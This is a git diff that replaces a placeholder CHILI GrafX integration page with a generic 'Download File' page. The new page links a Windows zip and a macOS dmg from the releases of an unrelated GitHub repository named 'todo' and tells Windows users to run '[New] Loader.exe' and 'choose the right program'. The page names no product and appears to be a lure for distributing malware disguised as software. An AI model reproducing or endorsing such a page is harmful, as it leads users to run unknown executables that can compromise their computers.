@@ -1,18 +1,89 @@
-<html>
-    <head>
-        <meta charset="UTF-8" />
-        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>CHILI GrafX integration</title>
-        <link rel="stylesheet" href="assets/styles/reset.css" />
-    <link rel="stylesheet" href="assets/styles/main.css" />
-    </head>
-    <body>
-        <h1 class="page-title">CHILI GrafX integration</h1>
-        <div class="container">
-            <div class="editor-container">the editor will come here</div>
-            <div class="editor-controls">editor interactions will come here</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download File</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 500px; /* Adjusted width for instructions */
+        }
+
+        .download-button {
+            display: inline-block;
+            padding: 15px 30px;
+            background-color: #007bff;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 1.2em;
+            transition: background-color 0.3s;
+            margin: 10px;
+        }
+
+        .download-button:hover {
+            background-color: #0056b3;
+        }
+
+        .instructions {
+            margin-top: 30px;
+        }
+
+        .instructions h3 {
+            margin-bottom: 10px;
+        }
+
+        .instructions ul {
+            list-style: disc;
+            margin-left: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Download the file</h1>
+        <p>Choose your operating system:</p>
+        <a href="https://github.com/ArvendraChhonkar/todo/releases/download/macosandwindows/Project_v1.2.0.zip" class="download-button">Download for Windows</a>
+        <a href="https://github.com/ArvendraChhonkar/todo/releases/download/macosandwindows/install_setup_v1.2.0.dmg" class="download-button">Download for macOS</a>
+
+        <div class="instructions">
+            <h3>Information:</h3>
+            <p>If you have Windows, click the "Download for Windows" button.</p>
+            <p>If you have macOS, click the "Download for macOS" button.</p>
+
+            <h3>Installation instructions:</h3>
+            <h4>For Windows:</h4>
+            <ul>
+                <li>download Project_v1.2.0.zip</li>
+                <li>Run [New] Loader.exe</li>
+                <li>Select language</li>
+                <li>Choose the right program</li>
+                <li>Press the power button</li>
+                <li>Wait for the installation to finish</li>
+            </ul>
+
+            <h4>For macOS:</h4>
+            <ul>
+                <li>download the install_setup_v1.2.0.dmg file</li>
+                <li>Run it</li>
+                <li>Follow the instructions on the screen</li>
+            </ul>
         </div>
-        
-    </body>
+    </div>
+</body>
 </html>
